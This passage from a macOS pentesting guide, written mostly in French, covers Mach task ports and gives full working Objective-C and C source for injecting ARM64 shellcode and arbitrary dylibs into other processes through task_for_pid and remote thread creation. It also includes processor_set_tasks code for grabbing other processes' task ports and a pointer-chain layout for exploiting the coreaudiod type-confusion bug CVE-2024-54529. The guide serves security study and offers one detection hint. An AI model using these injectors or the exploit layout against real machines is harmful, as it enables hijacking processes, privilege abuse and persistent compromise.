**Compilez** le programme précédent et ajoutez les **entitlements** nécessaires pour pouvoir injecter du code avec le même utilisateur (sinon vous devrez utiliser **sudo**).<sup>[[3]](#references)</sup>

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector
// Based on https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a?permalink_comment_id=2981669
// and on https://newosxbook.com/src.jl?tree=listings&file=inject.c


#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
> [!TIP]
> Pour que cela fonctionne sur iOS, vous avez besoin de l’entitlement `dynamic-codesigning` afin de pouvoir rendre une mémoire inscriptible exécutable.

### Dylib Injection in thread via Task port

Dans macOS, les **threads** peuvent être manipulés via **Mach** ou en utilisant l’API **posix `pthread`**. Le thread que nous avons généré lors de l’injection précédente a été créé à l’aide de l’API Mach, il **n’est donc pas compatible avec posix**.

Il était possible d’**injecter un simple shellcode** pour exécuter une commande, car celui-ci **n’avait pas besoin de fonctionner avec des API** compatibles avec **posix**, mais uniquement avec Mach. Des **injections plus complexes** nécessiteraient que le **thread** soit également **compatible avec posix**.

Par conséquent, pour **améliorer le thread**, celui-ci devrait appeler **`pthread_create_from_mach_thread`**, ce qui **créera un pthread valide**. Ce nouveau pthread pourrait ensuite **appeler dlopen** pour **charger une dylib** depuis le système. Ainsi, au lieu d’écrire un nouveau shellcode pour effectuer différentes actions, il est possible de charger des bibliothèques personnalisées.<sup>[[2]](#references)</sup>

Vous pouvez trouver des **dylibs d’exemple** ici (par exemple, celle qui génère un log que vous pouvez ensuite écouter) :


{{#ref}}
../macos-library-injection/macos-dyld-hijacking-and-dyld_insert_libraries.md
{{#endref}}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
if (rc == 0) inject(pid,action);
else
{
fprintf(stderr,"Dylib not found\n");
}

}
```
</details>
```bash
gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
./inject <pid-of-mysleep> </path/to/lib.dylib>
```
### Thread Hijacking via Task port <a href="#step-1-thread-hijacking" id="step-1-thread-hijacking"></a>

Dans cette technique, un thread du processus est hijacké :


{{#ref}}
macos-thread-injection-via-task-port.md
{{#endref}}

### Détection de l'injection via Task Port

L'appel de `task_for_pid` ou de `thread_create_*` incrémente un compteur dans la structure `task` du kernel, qui peut être consulté depuis le mode utilisateur en appelant `task_info(task, TASK_EXTMOD_INFO, ...)`

## Ports d'exception

Lorsqu'une exception se produit dans un thread, cette exception est envoyée au port d'exception désigné du thread. Si le thread ne la gère pas, elle est ensuite envoyée aux ports d'exception de la task. Si la task ne la gère pas, elle est alors envoyée au port de l'hôte, qui est géré par launchd (où elle sera acquittée). C'est ce qu'on appelle le triage des exceptions.

Notez qu'en général, à la fin, si le rapport n'est pas correctement traité, il sera pris en charge par le daemon ReportCrash. Cependant, il est possible qu'un autre thread de la même task gère l'exception ; c'est ce que font les outils de crash reporting comme `PLCreashReporter`.

## Autres objets

### Horloge

Tout utilisateur peut accéder aux informations relatives à l'horloge. Cependant, pour régler l'heure ou modifier d'autres paramètres, il faut être root.

Pour obtenir des informations, il est possible d'appeler des fonctions du sous-système `clock`, comme `clock_get_time`, `clock_get_attributtes` ou `clock_alarm`\
Pour modifier les valeurs, le sous-système `clock_priv` peut être utilisé avec des fonctions comme `clock_set_time` et `clock_set_attributes`

### Processeurs et ensemble de processeurs

Les APIs des processeurs permettent de contrôler un processeur logique individuel au moyen de fonctions telles que `processor_start`, `processor_exit`, `processor_info` et `processor_get_assignment`.

De plus, les APIs de l'**ensemble de processeurs** permettent de regrouper plusieurs processeurs au sein d'un groupe. Il est possible de récupérer l'ensemble de processeurs par défaut en appelant **`processor_set_default`**.\
Voici quelques APIs intéressantes pour interagir avec l'ensemble de processeurs :

- `processor_set_statistics`
- `processor_set_tasks`: Retourne un tableau de send rights vers toutes les tasks de l'ensemble de processeurs
- `processor_set_threads`: Retourne un tableau de send rights vers tous les threads de l'ensemble de processeurs
- `processor_set_stack_usage`
- `processor_set_info`

Comme mentionné dans [**ce post**](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/), cela permettait auparavant de contourner la protection mentionnée précédemment afin d'obtenir les task ports d'autres processus et de les contrôler en appelant **`processor_set_tasks`**, ce qui permettait d'obtenir un host port sur chaque processus.<sup>[[10]](#references)</sup>\
De nos jours, il faut être root pour utiliser cette fonction, et celle-ci est protégée : vous ne pourrez donc obtenir ces ports que sur des processus non protégés.<sup>[[10]](#references)</sup>

Vous pouvez essayer avec :

<details>

<summary><strong>processor_set_tasks code</strong></summary>
````c
// Main part of the code from https://newosxbook.com/articles/PST2.html
//gcc ./port_pid.c -o port_pid

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/sysctl.h>
#include <libproc.h>
#include <mach/mach.h>
#include <errno.h>
#include <string.h>
#include <mach/exception_types.h>
#include <mach/mach_host.h>
#include <mach/host_priv.h>
#include <mach/processor_set.h>
#include <mach/mach_init.h>
#include <mach/mach_port.h>
#include <mach/vm_map.h>
#include <mach/task.h>
#include <mach/task_info.h>
#include <mach/mach_traps.h>
#include <mach/mach_error.h>
#include <mach/thread_act.h>
#include <mach/thread_info.h>
#include <mach-o/loader.h>
#include <mach-o/nlist.h>
#include <sys/ptrace.h>

mach_port_t task_for_pid_workaround(int Pid)
{

host_t        myhost = mach_host_self(); // host self is host priv if you're root anyway..
mach_port_t   psDefault;
mach_port_t   psDefault_control;

task_array_t  tasks;
mach_msg_type_number_t numTasks;
int i;

thread_array_t       threads;
thread_info_data_t   tInfo;

kern_return_t kr;

kr = processor_set_default(myhost, &psDefault);

kr = host_processor_set_priv(myhost, psDefault, &psDefault_control);
if (kr != KERN_SUCCESS) { fprintf(stderr, "host_processor_set_priv failed with error %x\n", kr);
mach_error("host_processor_set_priv",kr); exit(1);}

printf("So far so good\n");

kr = processor_set_tasks(psDefault_control, &tasks, &numTasks);
if (kr != KERN_SUCCESS) { fprintf(stderr,"processor_set_tasks failed with error %x\n",kr); exit(1); }

for (i = 0; i < numTasks; i++)
{
int pid;
pid_for_task(tasks[i], &pid);
printf("TASK %d PID :%d\n", i,pid);
char pathbuf[PROC_PIDPATHINFO_MAXSIZE];
if (proc_pidpath(pid, pathbuf, sizeof(pathbuf)) > 0) {
printf("Command line: %s\n", pathbuf);
} else {
printf("proc_pidpath failed: %s\n", strerror(errno));
}
if (pid == Pid){
printf("Found\n");
return (tasks[i]);
}
}

return (MACH_PORT_NULL);
} // end workaround



int main(int argc, char *argv[]) {
/*if (argc != 2) {
fprintf(stderr, "Usage: %s <PID>\n", argv[0]);
return 1;
}

pid_t pid = atoi(argv[1]);
if (pid <= 0) {
fprintf(stderr, "Invalid PID. Please enter a numeric value greater than 0.\n");
return 1;
}*/

int pid = 1;

task_for_pid_workaround(pid);
return 0;
}

```

````

</details>

## XPC

### Basic Information

XPC, which stands for XNU (the kernel used by macOS) inter-Process Communication, is a framework for **communication between processes** on macOS and iOS. XPC provides a mechanism for making **safe, asynchronous method calls between different processes** on the system. It's a part of Apple's security paradigm, allowing for the **creation of privilege-separated applications** where each **component** runs with **only the permissions it needs** to do its job, thereby limiting the potential damage from a compromised process.

For more information about how this **communication work** on how it **could be vulnerable** check:


{{#ref}}
macos-xpc/
{{#endref}}

## MIG - Mach Interface Generator

MIG was created to **simplify the process of Mach IPC** code creation. This is because a lot of work to program RPC involves the same actions (packing arguments, sending the msg, unpacking the data in the server...).

MIC basically **generates the needed code** for server and client to communicate with a given definition (in IDL -Interface Definition language-). Even if the generated code is ugly, a developer will just need to import it and his code will be much simpler than before.

For more info check:


{{#ref}}
macos-mig-mach-interface-generator.md
{{#endref}}

## MIG handler type confusion -> fake vtable pointer-chain hijack

If a MIG handler **retrieves a C++ object by Mach message-supplied ID** (e.g., from an internal Object Map) and then **assumes a specific concrete type without validating the real dynamic type**, later virtual calls can dispatch through attacker-controlled pointers. In `coreaudiod`’s `com.apple.audio.audiohald` service (CVE-2024-54529), `_XIOContext_Fetch_Workgroup_Port` used the looked-up `HALS_Object` as an `ioct` and executed a vtable call via:<sup>[[9]](#references)</sup>

```asm
mov rax, qword ptr [rdi]
call qword ptr [rax + 0x168]  ; appel indirect via l'entrée de la vtable
```

Because `rax` comes from **multiple dereferences**, exploitation needs a structured pointer chain rather than a single overwrite. One working layout:

1. In the **confused heap object** (treated as `ioct`), place a **pointer at +0x68** to attacker-controlled memory.
2. At that controlled memory, place a **pointer at +0x0** to a **fake vtable**.
3. In the fake vtable, write the **call target at +0x168**, so the handler jumps to attacker-chosen code when dereferencing `[rax+0x168]`.

Conceptually:

```
HALS_Object + 0x68  -> controlled_object
*(controlled_object + 0x0) -> fake_vtable
*(fake_vtable + 0x168)     -> RIP target
```

### LLDB triage to anchor the gadget

1. **Break on the faulting handler** (or `mach_msg`/`dispatch_mig_server`) and trigger the crash to confirm the dispatch chain (`HALB_MIGServer_server -> dispatch_mig_server -> _XIOContext_Fetch_Workgroup_Port`).
2. In the crash frame, disassemble to capture the **indirect call slot offset** (`call qword ptr [rax + 0x168]`).
3. Inspect registers/memory to verify where `rdi` (base object) and `rax` (vtable pointer) originate and whether the offsets above are reachable with controlled data.
4. Use the offset map to heap-shape the **0x68 -> 0x0 -> 0x168** chain and convert the type confusion into a reliable control-flow hijack inside the Mach service.

## References

- [1] [Mach Ports – Darling Docs](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)
- [2] [Code injection on macOS – knight.sc](https://knight.sc/malware/2019/03/15/code-injection-on-macos.html)
- [3] [knightsc/inject.c – dlopen dylib injection into a remote Mach task (Gist)](https://gist.github.com/knightsc/45edfc4903a9d2fa9f5905f60b02ce5a)
- [4] [Don't talk all at once: Elevating privileges on macOS by audit token spoofing – Sector 7](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)
- [5] [XNU — `osfmk/mach/message.h` (Mach message structures and flags)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/message.h)
- [6] [XNU — `osfmk/mach/mach_port.defs` (port manipulation MIG interface)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/mach_port.defs)
- [7] [XNU — `osfmk/mach/task.defs` (`task_for_pid`, thread/task port operations)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/mach/task.defs)
- [8] [task_get_special_port – MIT Darwin XNU manual](https://web.mit.edu/darwin/src/modules/xnu/osfmk/man/task_get_special_port.html)
- [9] [Project Zero – Sound Barrier 2](https://projectzero.google/2026/01/sound-barrier-2.html)
- [10] [About the processor_set_tasks() access to kernel memory vulnerability – reverse.put.as](https://reverse.put.as/2014/05/05/about-the-processor_set_tasks-access-to-kernel-memory-vulnerability/)
- [11] [XNU — `osfmk/ipc/ipc_port.h` (port rights and internals)](https://github.com/apple-oss-distributions/xnu/blob/main/osfmk/ipc/ipc_port.h)

{{#include ../../../../banners/hacktricks-training.md}}
